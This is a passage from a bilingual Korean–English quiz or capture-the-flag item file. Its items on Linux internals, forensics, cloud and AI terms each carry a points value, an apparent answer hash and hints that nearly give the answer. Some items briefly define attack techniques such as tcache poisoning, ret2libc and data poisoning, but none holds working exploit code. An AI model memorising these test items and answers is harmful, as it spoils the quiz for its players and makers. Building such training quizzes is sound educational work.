      "ko": "glibc 2.26 이후 malloc 이 성능을 위해 도입한, 스레드마다 갓 해제된(free) 힙 청크를 단일 연결 리스트로 담아 두는 캐시 계층의 이름은? (공격자가 이 리스트의 next 포인터를 덮어써 임의 주소 할당을 얻는 'poisoning' 으로 악명 높은, 한 단어 소문자)",
      "en": "Since glibc 2.26, malloc keeps a per-thread cache layer that stores recently freed heap chunks in a singly-linked list for speed. Attackers overwrite that list's next pointer for an arbitrary allocation ('poisoning'). What is this layer's name? (one lowercase word)"
    },
    "hints": {
      "ko": [
        "이름은 'thread' 의 머리글자 + 'cache' 를 붙인 것입니다.",
        "관련 익스플로잇 기법을 '____ poisoning' 이라 부릅니다."
      ],
      "en": [
        "Its name is the initial of 'thread' + 'cache'.",
        "The related exploit technique is called '____ poisoning'."
      ]
    }
  },
  {
    "id": "t0_pwd",
    "tier": 0,
    "cat": "system",
    "track": "system",
    "points": 40,
    "ci": true,
    "hash": "a1159e9df3670d549d04524532629f5477ceb7deec9b45e47e8c009506ecb2c8",
    "fmt": "명령어 / command",
    "title": {
      "ko": "현재 디렉터리 출력",
      "en": "Where Am I"
    },
    "prompt": {
      "ko": "리눅스에서 현재 작업 중인 디렉터리의 절대 경로를 출력하는 명령어는? (한 단어)",
      "en": "Which Linux command prints the absolute path of your current working directory? (one word)"
    },
    "hints": {
      "ko": [
        "'print working directory'의 약자입니다.",
        "`___` 를 치면 예: `/home/user` 가 출력됩니다."
      ],
      "en": [
        "Short for 'print working directory'.",
        "Typing `___` prints e.g. `/home/user`."
      ]
    }
  },
  {
    "id": "t0_ps",
    "tier": 0,
    "cat": "system",
    "track": "system",
    "points": 45,
    "ci": true,
    "hash": "6527c9361a2f469c5275afcb5d06e53013367cd231995de13dc7218711388382",
    "fmt": "명령어 / command",
    "title": {
      "ko": "실행 중인 프로세스",
      "en": "Running Processes"
    },
    "prompt": {
      "ko": "현재 실행 중인 프로세스 목록을 그 시점의 상태로 한 번에 보여 주는 리눅스 명령어는? (한 단어, 흔히 `aux` 옵션과 함께 씀)",
      "en": "Which Linux command lists the currently running processes as they are at that moment? (one word, often used with `aux`)"
    },
    "hints": {
      "ko": [
        "'process status'의 약자입니다.",
        "`__ aux` 로 모든 사용자의 프로세스를 봅니다."
      ],
      "en": [
        "Short for 'process status'.",
        "`__ aux` lists every user's processes."
      ]
    }
  },
  {
    "id": "t1_chown",
    "tier": 1,
    "cat": "system",
    "track": "system",
    "points": 65,
    "ci": true,
    "hash": "f92b5215aa322cc1e02f2d805b390d62d5ff942c8fa66e53f417a10abbb959cd",
    "fmt": "명령어 / command",
    "title": {
      "ko": "소유자 바꾸기",
      "en": "Change the Owner"
    },
    "prompt": {
      "ko": "파일이나 디렉터리의 소유자(owner)를 변경하는 리눅스 명령어는? (한 단어)",
      "en": "Which Linux command changes the owner of a file or directory? (one word)"
    },
    "hints": {
      "ko": [
        "'change owner'를 줄인 이름입니다.",
        "`____ root:root file` 처럼 그룹까지 함께 바꿀 수 있습니다."
      ],
      "en": [
        "Its name shortens 'change owner'.",
        "`____ root:root file` can set the group too."
      ]
    }
  },
  {
    "id": "t2_nm",
    "tier": 2,
    "cat": "system",
    "track": "system",
    "points": 90,
    "ci": true,
    "hash": "2ca7289b5248632c8fe5386b972e8fde6585068c5cb8e2948489e10e7be6d4d8",
    "fmt": "도구 이름 / tool name (2글자 / 2 chars)",
    "title": {
      "ko": "심볼 테이블 나열",
      "en": "List the Symbols"
    },
    "prompt": {
      "ko": "오브젝트 파일이나 실행 파일의 심볼 테이블(함수·전역변수 이름과 주소)을 나열하는 binutils 도구는? (두 글자 명령어)",
      "en": "Which binutils tool lists the symbol table (function/global names and addresses) of an object or executable? (two-letter command)"
    },
    "hints": {
      "ko": [
        "'name'의 앞 두 글자와 같은 두 글자 이름입니다.",
        "`__ -C a.out` 로 C++ 심볼을 디맹글해 봅니다."
      ],
      "en": [
        "A two-letter name, like the first two letters of 'name'.",
        "`__ -C a.out` demangles C++ symbols."
      ]
    }
  },
  {
    "id": "t3_ptrace",
    "tier": 3,
    "cat": "system",
    "track": "system",
    "points": 115,
    "ci": true,
    "hash": "160ec8e507f2527b4de8f753c43de80b5aca90d0918e709d88c5519d6b122e34",
    "fmt": "시스템 콜 / syscall",
    "title": {
      "ko": "프로세스를 붙잡는 콜",
      "en": "The Call Behind Debuggers"
    },
    "prompt": {
      "ko": "디버거가 다른 프로세스의 제어권을 얻어 메모리·레지스터를 읽고 제어할 때 내부적으로 호출하는 리눅스 시스템 콜의 이름은? (한 단어)",
      "en": "What Linux system call do debuggers use under the hood to hook into another process and read/control its memory and registers? (one word)"
    },
    "hints": {
      "ko": [
        "이름은 'process' + 'trace'의 축약입니다.",
        "안티디버깅 기법은 이 콜이 이미 걸려 있으면 두 번째 호출이 실패하는 점을 악용합니다."
      ],
      "en": [
        "Its name is 'process' + 'trace'.",
        "Anti-debugging tricks abuse that a second call fails if one is already attached."
      ]
    }
  },
  {
    "id": "t4_ret2libc",
    "tier": 4,
    "cat": "system",
    "track": "system",
    "points": 155,
    "ci": true,
    "hash": "c57eaf6530a6ac809ae16cc9062eb65bab051b73b6a2f5fa2202d7c3debb5cb7",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "이미 있는 함수로 리턴",
      "en": "Return Into Existing Code"
    },
    "prompt": {
      "ko": "NX(스택 실행 방지)를 우회하려고, 스택에 셸코드를 넣는 대신 libc의 기존 함수(예: system)로 리턴 주소를 덮어써 실행 흐름을 넘기는 고전 익스플로잇 기법의 이름은? (숫자 포함 한 단어)",
      "en": "To bypass NX (non-executable stack), instead of injecting shellcode you overwrite the return address to jump into an existing libc function (e.g. system). Name this classic exploit technique. (one token, contains a digit)"
    },
    "hints": {
      "ko": [
        "'return to libc'에서 to 를 숫자 2로 씁니다.",
        "`ret___libc` — 보통 libc의 `system(\"/bin/sh\")` 로 점프합니다."
      ],
      "en": [
        "'return to libc', with 'to' written as the digit 2.",
        "`ret___libc` — typically jumps into libc's `system(\"/bin/sh\")`."
      ]
    }
  },
  {
    "id": "t4_seccomp",
    "tier": 4,
    "cat": "system",
    "track": "system",
    "points": 150,
    "ci": true,
    "hash": "b10f708e69418485dbf6225020bf24204fd32b2a50c17e4fd16a76e09558a5f9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "시스템 콜 화이트리스트",
      "en": "Filter the Syscalls"
    },
    "prompt": {
      "ko": "프로세스나 컨테이너가 호출할 수 있는 시스템 콜을 화이트리스트로 제한해 공격 표면을 줄이는 리눅스 커널 보안 기능의 이름은? (한 단어)",
      "en": "What Linux kernel security feature restricts which system calls a process/container may make (via a whitelist), shrinking the attack surface? (one word)"
    },
    "hints": {
      "ko": [
        "'secure computing mode'를 줄인 이름입니다.",
        "Docker는 기본 `sec____` 프로파일로 위험한 syscall을 막습니다."
      ],
      "en": [
        "Short for 'secure computing mode'.",
        "Docker ships a default `sec____` profile blocking dangerous syscalls."
      ]
    }
  },
  {
    "id": "t0_ioc",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 45,
    "ci": true,
    "hash": "7354a0024740d89096dc6137ff3bb47df328ab8ea22f20e88c059d387e58aeae",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "침해의 흔적",
      "en": "Traces of a Breach"
    },
    "prompt": {
      "ko": "침해가 발생했음을 알려 주는 관찰 가능한 흔적(악성 IP·해시·도메인 등)을 통칭하는 3글자 약어는?",
      "en": "What 3-letter acronym collectively names the observable artifacts (malicious IPs, hashes, domains) that signal a compromise has occurred?"
    },
    "hints": {
      "ko": [
        "Indicator Of Compromise.",
        "위협 인텔리전스 피드가 이 값들을 공유합니다."
      ],
      "en": [
        "Indicator Of Compromise.",
        "Threat-intel feeds share these values."
      ]
    }
  },
  {
    "id": "t0_ram",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 45,
    "ci": true,
    "hash": "a631f4488a457da27b4a64dc8f2d85085b50ff568be99125cf6f8f45c759878e",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "가장 먼저 수집",
      "en": "Grab It First"
    },
    "prompt": {
      "ko": "휘발성이 높아 전원을 끄면 사라지므로 포렌식에서 가장 먼저 수집해야 하는 주기억장치의 3글자 약자는? (수집 순서상 최우선)",
      "en": "What 3-letter abbreviation names the volatile main memory that must be collected first in forensics because it is lost on power-off? (top of the order of volatility)"
    },
    "hints": {
      "ko": [
        "Random Access Memory.",
        "이 영역을 통째로 저장한 것을 '메모리 덤프'라고 합니다."
      ],
      "en": [
        "Random Access Memory.",
        "A full capture of it is called a 'memory dump'."
      ]
    }
  },
  {
    "id": "t1_netstat",
    "tier": 1,
    "cat": "forensics",
    "track": "forensics",
    "points": 60,
    "ci": true,
    "hash": "9a990e354cd9648e4a6371a05999dbd45da5831e866917f41b0f966f07bfea86",
    "fmt": "명령어 / command",
    "title": {
      "ko": "열린 연결 보기",
      "en": "Open Connections"
    },
    "prompt": {
      "ko": "호스트의 열린 포트와 활성 네트워크 연결(TCP/UDP)을 보여 주는 고전 명령어는? (한 단어)",
      "en": "Which classic command shows a host open ports and active network connections (TCP/UDP)? (one word)"
    },
    "hints": {
      "ko": [
        "'network statistics'의 축약입니다.",
        "`____ -ano` 로 연결과 PID를 함께 봅니다(요즘은 `ss` 로 대체)."
      ],
      "en": [
        "Short for 'network statistics'.",
        "`____ -ano` shows connections with PIDs (modern `ss` replaces it)."
      ]
    }
  },
  {
    "id": "t2_steghide",
    "tier": 2,
    "cat": "forensics",
    "track": "forensics",
    "points": 85,
    "ci": true,
    "hash": "cb4acd2b3839eea32ef807b243408ba3be1bbe74006bdf696f498cb966c688fe",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "그림 속 데이터",
      "en": "Data Concealed in a Picture"
    },
    "prompt": {
      "ko": "이미지·오디오 파일 안에 데이터를 숨기거나(임베드) 추출하는 대표적인 스테가노그래피 CLI 도구의 이름은? (한 단어)",
      "en": "Which popular steganography CLI tool embeds or extracts data concealed within image/audio files? (one word)"
    },
    "hints": {
      "ko": [
        "'steganography' + 'hide'를 합친 이름입니다.",
        "`____ extract -sf cover.jpg` 로 숨긴 데이터를 꺼냅니다."
      ],
      "en": [
        "Its name blends 'steganography' + 'hide'.",
        "`____ extract -sf cover.jpg` pulls out the concealed data."
      ]
    }
  },
  {
    "id": "t3_c2",
    "tier": 3,
    "cat": "forensics",
    "track": "forensics",
    "points": 110,
    "ci": true,
    "hash": "9c0abe51c6e6655d81de2d044d4fb194931f058c0426c67c7285d8f5657ed64a",
    "fmt": "약어 / acronym (2글자 / 2 chars)",
    "title": {
      "ko": "좀비의 사령탑",
      "en": "The Attacker Command Post"
    },
    "prompt": {
      "ko": "감염된 좀비 호스트가 지시를 받고 탈취 데이터를 보내는, 공격자가 운영하는 명령·제어 서버를 가리키는 2글자 약어는? (C&C 라고도 함)",
      "en": "What 2-character abbreviation names the attacker-run command-and-control server that infected hosts beacon to for orders and data exfiltration? (also written C&C)"
    },
    "hints": {
      "ko": [
        "'Command and Control'에서 두 번째 C를 숫자 2로 줄입니다.",
        "비콘 주기(beacon interval)를 분석해 이 트래픽을 탐지합니다."
      ],
      "en": [
        "'Command and Control', the second C written as the digit 2.",
        "Analysts spot it by its beacon interval."
      ]
    }
  },
  {
    "id": "t4_rootkit",
    "tier": 4,
    "cat": "forensics",
    "track": "forensics",
    "points": 155,
    "ci": true,
    "hash": "189ca7f3ff5335190ea4ecedaaad8e9613c8165bf99d563a82b1033af59c0e37",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "스스로를 숨기는 것",
      "en": "Hiding Its Own Tracks"
    },
    "prompt": {
      "ko": "커널이나 시스템 깊숙이 숨어 자신의 존재(프로세스·파일·연결)를 은폐하며 지속적 관리자 권한을 유지하는 악성코드 유형의 이름은? (한 단어)",
      "en": "What single word names malware that hides deep in the kernel/system, concealing its own presence (processes, files, connections) to keep persistent admin access?"
    },
    "hints": {
      "ko": [
        "'root'(관리자) + 'kit'(도구모음)의 합성어입니다.",
        "커널 모드 변종은 API를 후킹(SSDT 등)해 결과를 조작합니다."
      ],
      "en": [
        "A blend of 'root' (admin) + 'kit' (toolset).",
        "Kernel-mode variants hook APIs (e.g. SSDT) to falsify results."
      ]
    }
  },
  {
    "id": "t4_shimcache",
    "tier": 4,
    "cat": "forensics",
    "track": "forensics",
    "points": 150,
    "ci": true,
    "hash": "513eecf62e066a0b3ac8a9e09a2a1ed5006d690351897f6db49def663656ef99",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "호환성 캐시의 흔적",
      "en": "The Compatibility Cache"
    },
    "prompt": {
      "ko": "윈도우 애플리케이션 호환성 데이터베이스(AppCompatCache)에 남아 프로그램 실행·존재 흔적을 보여 주는 포렌식 아티팩트의 통칭은? (한 단어)",
      "en": "What single word names the Windows forensic artifact stored in the Application Compatibility database (AppCompatCache) that evidences program execution/presence?"
    },
    "hints": {
      "ko": [
        "'shim'(호환성 계층) + 'cache'의 합성어입니다.",
        "레지스트리 `...\\\\AppCompatCache` 값에서 파싱합니다."
      ],
      "en": [
        "A blend of 'shim' (compat layer) + 'cache'.",
        "Parsed from the registry `...\\\\AppCompatCache` value."
      ]
    }
  },
  {
    "id": "t0_saas",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 45,
    "ci": true,
    "hash": "98650c35cd5ea2afde8468b6d1866d3de00c715eb34044136bc3aad5c9b7b3db",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "설치 없는 소프트웨어",
      "en": "Software, Just Use It"
    },
    "prompt": {
      "ko": "사용자가 설치·인프라 관리 없이 웹으로 바로 쓰는 완성형 소프트웨어 제공 모델(예: Gmail, Salesforce)을 가리키는 약어는?",
      "en": "What abbreviation names the model that delivers ready-to-use software over the web with no install or infra management (e.g. Gmail, Salesforce)?"
    },
    "hints": {
      "ko": [
        "Software as a Service.",
        "`S__S` — 4글자 약어입니다."
      ],
      "en": [
        "Software as a Service.",
        "`S__S` — a 4-character abbreviation."
      ]
    }
  },
  {
    "id": "t0_sharedresp",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 50,
    "ci": true,
    "hash": "2dbab7a48de51f5c2cbc3e0d6a9a9d6d2a6be0581df0789db88ec55154ba239d",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "누가 무엇을 책임지나",
      "en": "Who Secures What"
    },
    "prompt": {
      "ko": "클라우드 보안에서 '클라우드 자체(of the cloud)는 제공업체가, 클라우드 안(in the cloud)의 데이터·설정은 고객이 책임진다'는 원칙을 가리키는 두 단어(영문) 모델 이름은? (`____ ____ model`)",
      "en": "In cloud security, what two-word model states the provider secures the cloud itself while the customer secures their data/configuration in the cloud? (`____ ____ model`)"
    },
    "hints": {
      "ko": [
        "'공유된 책임'을 영어 두 단어로 옮긴 것입니다.",
        "`shared ______________` — 오설정에 의한 데이터 유출은 대개 고객 책임 영역."
      ],
      "en": [
        "Two English words for '공유된 책임'.",
        "`shared ______________` — misconfig breaches usually fall on the customer side."
      ]
    }
  },
  {
    "id": "t1_helm",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 65,
    "ci": true,
    "hash": "ab14d3faa25e917efe6e7135d4ecca197866738885a88b9b95d1a16d2bb5b323",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "차트로 배포",
      "en": "Deploy by Chart"
    },
    "prompt": {
      "ko": "쿠버네티스 애플리케이션을 'chart'라는 패키지 단위로 배포·관리하는 대표적인 패키지 매니저의 이름은? (한 단어)",
      "en": "What is the name of the popular package manager that deploys and manages Kubernetes apps as packages called 'charts'? (one word)"
    },
    "hints": {
      "ko": [
        "배의 '키(방향타)'를 뜻하는 영어 단어입니다(쿠버네티스=키잡이 테마).",
        "`____ install myrelease ./chart` 로 배포합니다."
      ],
      "en": [
        "The English word for a ship steering wheel (fits the Kubernetes helmsman theme).",
        "`____ install myrelease ./chart` deploys it."
      ]
    }
  },
  {
    "id": "t2_ingress",
    "tier": 2,
    "cat": "cloud",
    "track": "cloud",
    "points": 90,
    "ci": true,
    "hash": "487a0a9a39038de9767bdcbc6f81bf46cd7dcedb81be97d41dd6079d35bd922e",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "외부 트래픽 라우팅",
      "en": "Routing Traffic In"
    },
    "prompt": {
      "ko": "쿠버네티스에서 외부 HTTP(S) 트래픽을 클러스터 내부 서비스로 라우팅하는 규칙(호스트/경로 기반)을 정의하는 리소스의 이름은? (한 단어)",
      "en": "In Kubernetes, what resource defines rules (host/path-based) that route external HTTP(S) traffic to internal services? (one word)"
    },
    "hints": {
      "ko": [
        "'들어오는 트래픽(inbound)'을 뜻하는 영어 단어이며, 반대말은 egress 입니다.",
        "보통 nginx/traefik 컨트롤러가 이 리소스를 구현합니다."
      ],
      "en": [
        "The English word for 'inbound', the opposite of egress.",
        "An nginx/traefik controller usually implements it."
      ]
    }
  },
  {
    "id": "t3_privesc",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 130,
    "ci": true,
    "hash": "d3fa9e1e93989d0b1b266c8f4a5eafad0d0b3ff1db8c6136a9b8fcbf30a29b5e",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "권한을 끌어올리다",
      "en": "Climbing the Privileges"
    },
    "prompt": {
      "ko": "낮은 권한으로 침투한 뒤, 과도한 권한 정책이나 취약점을 악용해 더 높은 권한(관리자/root)을 획득하는 공격 단계를 가리키는 두 단어(영문)는?",
      "en": "What two-word term names the attack stage where a low-privilege foothold is leveraged (via over-permissive policies or a vuln) to gain higher (admin/root) privileges?"
    },
    "hints": {
      "ko": [
        "'권한 상승'을 영어 두 단어로 옮긴 것입니다.",
        "`privilege ____________` — 수직(vertical)/수평(horizontal)으로 나뉩니다."
      ],
      "en": [
        "Two English words for '권한 상승'.",
        "`privilege ____________` — split into vertical and horizontal."
      ]
    }
  },
  {
    "id": "t4_datapoisoning",
    "tier": 4,
    "cat": "ai",
    "track": "cloud",
    "points": 140,
    "ci": true,
    "hash": "8523305e90d58767dc73336f41bf038b80c9a9823f9bd3ea010594bcc5abd2e8",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "학습 데이터 오염",
      "en": "Corrupting the Training Set"
    },
    "prompt": {
      "ko": "공격자가 머신러닝/LLM의 학습 데이터에 악의적 샘플을 몰래 주입해 모델의 판단이나 출력을 왜곡시키는, OWASP LLM Top 10에 포함된 공격을 가리키는 두 단어(영문)는?",
      "en": "What two-word attack (in the OWASP LLM Top 10) secretly injects malicious samples into an ML/LLM's training data to skew the model's behavior or output?"
    },
    "hints": {
      "ko": [
        "학습 '데이터'를 '오염'시킨다는 뜻의 두 단어입니다.",
        "`data ________` — 백도어(트리거) 삽입에도 쓰입니다."
      ],
      "en": [
        "Two words meaning to contaminate the training data.",
        "`data ________` — also used to plant backdoor triggers."
      ]
    }
  },
  {
    "id": "t4_gvisor",
    "tier": 4,
    "cat": "cloud",
    "track": "cloud",
    "points": 140,
    "ci": true,
    "hash": "1f6d325084c7647bcd2a0352753a861a30a972c5ad6b75f6c2f1092961bb98f8",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "유저공간 커널 샌드박스",
      "en": "A Kernel in User Space"
    },
    "prompt": {
      "ko": "구글이 만든, 컨테이너와 호스트 커널 사이에서 시스템 콜을 가로채 사용자공간 커널로 처리함으로써 강한 격리를 제공하는 샌드박스 런타임의 이름은? (한 단어)",
      "en": "What is the name of Google's sandbox runtime that intercepts container syscalls and services them in a user-space kernel for stronger isolation? (one word)"
    },
    "hints": {
      "ko": [
        "소문자 g 로 시작하며 뒤에 'Visor(면갑)'가 붙습니다.",
        "`runsc` 런타임으로 구현되어 Docker/K8s 에 연결됩니다."
      ],
      "en": [
        "Starts with a lowercase g, followed by 'Visor'.",
        "Implemented as the `runsc` runtime, plugged into Docker/K8s."
      ]
    }
  },
  {
    "id": "t0_hallucination",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 45,
    "ci": true,
    "hash": "2c229d9fff93795f5e6a9d9b9ac19d6d1211b7c82c052a0aac3c95e7449137a0",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "자신 있게 틀리기",
      "en": "Confidently Wrong"
    },
    "prompt": {
      "ko": "언어 모델이 근거가 없는데도 사실인 양 매끄럽게 지어내는 출력을 부르는 말은? (영어 한 단어)",
      "en": "What do we call output a language model invents with no grounding, yet states as smoothly as fact? (one English word)"
    },
    "hints": {
      "ko": [
        "사람이 없는 것을 보거나 듣는 증상에서 따온 이름입니다.",
        "모델은 \"모른다\"가 아니라 그럴듯한 문장을 만들어 냅니다."
      ],
      "en": [
        "Named after perceiving something that is not there.",
        "The model does not say \"I do not know\" — it produces something plausible."
      ]
    }
  },
  {
    "id": "t0_guardrail",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 40,
    "ci": true,
    "hash": "2f0a9e4fec74e596ad09c1ed0f7b77efd01d2149acc4d492e06a87a0da365b1f",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "난간을 세워라",
      "en": "A Rail Along the Edge"
    },
    "prompt": {
      "ko": "모델의 입력과 출력을 정책에 따라 검사·차단해 위험한 응답이 나가지 않게 막는 보호 장치를 통칭하는 영어 한 단어는?",
      "en": "What single English word names the protective layer that inspects and blocks a model's inputs and outputs against policy so unsafe responses never leave?"
    },
    "hints": {
      "ko": [
        "도로 갓길에 세워 차가 벼랑으로 떨어지지 않게 막는 그 시설의 이름입니다.",
        "모델 자체를 고치는 것이 아니라 바깥에 두르는 층입니다."
      ],
      "en": [
        "Named after the barrier on a road that keeps a car from going over the edge.",
        "It wraps around the model rather than changing it."
      ]
    }
  },
  {
    "id": "t0_inference",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 45,
    "ci": true,
    "hash": "925733dafd743699fa17409329abdb2728da89ba5736e44ad0fd4a67836e9f9c",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "학습은 끝났다",
      "en": "Training Is Over"
    },
    "prompt": {
      "ko": "학습이 모두 끝난 모델이 실제 요청을 받아 응답을 만들어 내는 실행 단계를 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What is the runtime stage called, where a fully trained model takes a real request and produces a response? (one English word)"
    },
    "hints": {
      "ko": [
        "학습(training)과 짝을 이루는 반대편 단계입니다.",
        "이 단계의 비용이 서비스 운영비의 대부분을 차지합니다."
      ],
      "en": [
        "The counterpart stage to training.",
        "Its cost dominates what it takes to run the service."
      ]
    }
  },
  {
    "id": "t0_dataset",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 40,
    "ci": true,
    "hash": "b277fd623676a525c29b9eb155afc8c9010681814ceafb2d7627f47b9a232576",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "재료 창고",
      "en": "The Pantry"
    },
    "prompt": {
      "ko": "모델을 학습시킬 때 먹이는 자료 묶음 전체를 가리키는 영어 한 단어는?",
      "en": "What single English word names the whole body of material a model is trained on?"
    },
    "hints": {
      "ko": [
        "자료(data)와 묶음(set)을 합친 낱말입니다.",
        "여기에 손을 대는 공격이 오염(poisoning)입니다."
      ],
      "en": [
        "A compound of data and set.",
        "Tampering with it is what poisoning attacks do."
      ]
    }
  },
  {
    "id": "t0_tokenizer",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 50,
    "ci": true,
    "hash": "5f97e3774c51edd1d63706c2ec3826c564a067794770cdab0f8c4797971cacf9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "글자를 조각내는 것",
      "en": "The Chopper"
    },
    "prompt": {
      "ko": "사람이 쓴 문장을 모델이 실제로 다루는 작은 조각들로 잘라 번호를 매기는 구성요소의 이름은? (영어 한 단어)",
      "en": "What is the component called that cuts human text into the small numbered pieces a model actually consumes? (one English word)"
    },
    "hints": {
      "ko": [
        "잘라낸 조각 하나하나를 \"토큰\"이라 부릅니다 — 그 일을 하는 주체의 이름을 답하세요.",
        "같은 문장이라도 이것이 다르면 조각 수가 달라집니다."
      ],
      "en": [
        "Each piece it produces is called a token — name the thing that does the cutting.",
        "Change it and the same sentence costs a different number of pieces."
      ]
    }
  },
  {
    "id": "t0_seed",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 50,
    "ci": true,
    "hash": "19b25856e1c150ca834cffc8b59b23adbd0ec0389e58eb22b3b64768098d002b",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "같은 답을 두 번",
      "en": "The Same Answer Twice"
    },
    "prompt": {
      "ko": "난수 생성을 고정해 같은 입력에 같은 출력이 재현되도록 만들 때 지정하는 값의 이름은? (영어 한 단어)",
      "en": "What is the value called that you pin down so a random generator repeats itself and the same input yields the same output? (one English word)"
    },
    "hints": {
      "ko": [
        "땅에 심는 그 낱말과 같은 단어입니다.",
        "실험을 재현하거나 버그를 다시 만들어 낼 때 반드시 기록해 둡니다."
      ],
      "en": [
        "The same word as the thing you plant in soil.",
        "You record it when you need an experiment or a bug to reproduce."
      ]
    }
  },
  {
    "id": "t0_alignment",
    "tier": 0,
    "cat": "ai",
    "track": "ai",
    "points": 60,
    "ci": true,
    "hash": "47ccb97a79f5a2bff2713968c83bbbea9cd53d2edf6b0a47439910e111c95fe9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "의도를 맞추다",
      "en": "Matching Intent"
    },
    "prompt": {
      "ko": "모델이 사람의 의도와 운영 정책을 따르도록 학습·조정하는 작업 전반을 가리키는 영어 한 단어는?",
      "en": "What single English word covers the work of training and tuning a model so it follows human intent and operator policy?"
    },
    "hints": {
      "ko": [
        "바퀴 정렬을 맞춘다고 할 때 쓰는 그 단어입니다.",
        "이것을 무너뜨려 금지된 응답을 끌어내려는 시도가 안전장치 우회 공격입니다."
      ],
      "en": [
        "The same word used for lining up a car's wheels.",
        "Attacks that pull forbidden output are attempts to break exactly this."
      ]
    }
  },
  {
    "id": "t1_rag",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 65,
    "ci": true,
    "hash": "a3e690053061793bb12ad4c32aace5856f57f1694d3608df1379d240ce1bbc5b",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "찾아서 붙여주기",
      "en": "Fetch, Then Answer"
    },
    "prompt": {
      "ko": "모델이 답하기 전에 외부 문서를 먼저 검색해 그 내용을 프롬프트에 끼워 넣어 주는 구조의 3글자 약어는?",
      "en": "What 3-letter abbreviation names the design where documents are searched first and pasted into the prompt before the model answers?"
    },
    "hints": {
      "ko": [
        "Retrieval-Augmented Generation의 머리글자입니다.",
        "검색된 문서에 공격 문구가 심겨 있으면 그것이 그대로 모델 입력이 됩니다."
      ],
      "en": [
        "The initials of Retrieval-Augmented Generation.",
        "If the fetched document carries planted instructions, they become model input verbatim."
      ]
    }
  },
  {
    "id": "t1_embedding",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 70,
    "ci": true,
    "hash": "aa580156f36e357b5bfb0dcd869a026c7b0a244e7b01cba17d5da1dc1e7039cd",
    "fmt": "한 단어 / one word (-ing으로 끝남 / ends in -ing)",
    "title": {
      "ko": "의미를 숫자로",
      "en": "Meaning as Numbers"
    },
    "prompt": {
      "ko": "단어나 문서의 의미를 고정 길이의 실수 벡터로 바꾼 표현을 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What do we call the representation that turns a word or document's meaning into a fixed-length vector of numbers? (one English word)"
    },
    "hints": {
      "ko": [
        "비슷한 뜻일수록 벡터 사이 거리가 가깝습니다.",
        "이 벡터만 있어도 원문을 상당 부분 되살릴 수 있어 그 자체가 민감 정보입니다."
      ],
      "en": [
        "Closer vectors mean closer meanings.",
        "The vectors alone can reconstruct much of the original text, so they are sensitive on their own."
      ]
    }
  },
  {
    "id": "t1_mcp",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 70,
    "ci": true,
    "hash": "10182ab855ff772753c05b2fea333666b5f312835d32936b6b03e08ef2cbd6d3",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "도구를 꽂는 규격",
      "en": "The Socket for Tools"
    },
    "prompt": {
      "ko": "모델에 외부 도구와 자원을 표준화된 방식으로 연결하기 위해 Anthropic이 공개한 개방형 프로토콜의 3글자 약어는?",
      "en": "What 3-letter abbreviation names the open protocol Anthropic published for connecting external tools and resources to a model in a standard way?"
    },
    "hints": {
      "ko": [
        "Model Context Protocol의 머리글자입니다.",
        "연결한 서버가 신뢰할 수 없으면 그 서버의 응답이 곧 모델 입력이 됩니다."
      ],
      "en": [
        "The initials of Model Context Protocol.",
        "If a connected server is untrusted, its responses become model input."
      ]
    }
  },
  {
    "id": "t1_lora",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 70,
    "ci": true,
    "hash": "d339f720de1fd92a672df9ef19a8cdbda6171cbf33fcd35ad95c46f8aebaf628",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "가볍게 갈아끼우기",
      "en": "Swap In, Stay Light"
    },
    "prompt": {
      "ko": "원본 가중치는 얼려 둔 채 작은 저계수 행렬만 학습해 덧붙이는 경량 미세조정 기법의 4글자 약어는?",
      "en": "What 4-letter abbreviation names the lightweight tuning method that freezes the original weights and trains only small low-rank matrices to add on top?"
    },
    "hints": {
      "ko": [
        "Low-Rank Adaptation의 머리글자입니다.",
        "결과물이 작은 파일이라 배포가 쉽고, 그래서 출처가 불분명한 것을 받아 붙이는 위험도 큽니다."
      ],
      "en": [
        "The initials of Low-Rank Adaptation.",
        "The result is a small file — easy to share, and just as easy to accept from an unknown source."
      ]
    }
  },
  {
    "id": "t1_safetensors",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 65,
    "ci": true,
